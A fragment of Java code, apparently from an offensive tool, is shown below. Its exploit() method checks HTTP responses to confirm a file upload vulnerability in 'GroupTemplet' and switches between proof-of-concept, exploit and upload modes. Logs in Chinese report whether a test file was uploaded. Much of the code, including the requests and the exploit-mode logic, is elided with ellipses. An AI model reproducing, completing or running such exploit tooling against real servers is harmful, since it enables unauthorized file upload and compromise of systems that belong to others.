    ...
    public void exploit() throws ClassNotFoundException, NoSuchFieldException, InstantiationException, IllegalAccessException, IOException {
        try {
            ...
            if (responseCode1 == HttpURLConnection.HTTP_OK) {
                ...
                if (responseCode2 == HttpURLConnection.HTTP_OK && responseText2.contains(pocFlag) && Config.MOD.equals(Mod.POC)) {
                    logMessage("[+] GroupTemplet 文件上传漏洞存在, 成功上传测试文件: " + fileUrl);
                    file.delete();
                    return;
                } else if ((responseCode2 != HttpURLConnection.HTTP_OK || !responseText2.contains(pocFlag)) && Config.MOD.equals(Mod.POC)) {
                    logMessage("[-] GroupTemplet 文件上传漏洞不存在, 请尝试手动探测.");
                    file.delete();
                    return;
                } else if (responseCode2 == HttpURLConnection.HTTP_OK && responseText2.contains(expFlag) && Config.MOD.equals(Mod.EXP)) {
                    ...
                    file.delete();
                    return;
                } else if (responseCode2 == HttpURLConnection.HTTP_OK && Config.MOD.equals(Mod.UPLOAD)) {
